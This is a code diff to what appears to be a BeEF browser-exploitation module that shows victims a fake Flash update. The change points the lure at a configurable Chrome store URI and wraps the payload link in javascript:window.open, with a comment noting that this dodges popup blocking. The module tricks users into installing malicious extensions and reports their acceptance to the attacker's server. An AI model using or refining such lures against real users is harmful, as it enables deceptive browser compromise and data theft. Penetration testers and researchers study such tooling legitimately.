@@ -10,13 +10,13 @@ beef.execute(function() {
   	var image = "<%== @image %>";
     var payload_type = "<%== @payload %>";
     var payload_root =  "<%== @payload_root %>";
-
-    var chrome_extension = "/demos/adobe_flash_update.crx";
+    var chrome_store_uri = "<%== @chrome_store_uri %>";
     var firefox_extension = "/api/ipec/ff_extension";
     var payload = "";
+
     switch (payload_type) {
         case "Chrome_Extension":
-            payload = payload_root + chrome_extension;
+            payload = chrome_store_uri;
             break;
         case "Firefox_Extension":
             payload = payload_root + firefox_extension;
@@ -32,7 +32,9 @@ beef.execute(function() {
 	div.setAttribute('style', 'position:absolute; top:30%; left:40%;');
 	div.setAttribute('align', 'center');
 	document.body.appendChild(div);
-	div.innerHTML= '<a href=\'' + payload + '\' ><img src=\''+ image +'\'  /></a>';
+	// window.open is very useful when using data URI vectors and the IFrame/Object tag
+	// also, as the user is clicking on the link, the new tab opener is not blocked by the browser.
+    div.innerHTML= "<a href=\"javascript:window.open('" + payload + "')\"><img src=\"" + image + "\" /></a>";
     $j("#splash").click(function () {
       $j(this).hide();
         beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer=user has accepted');
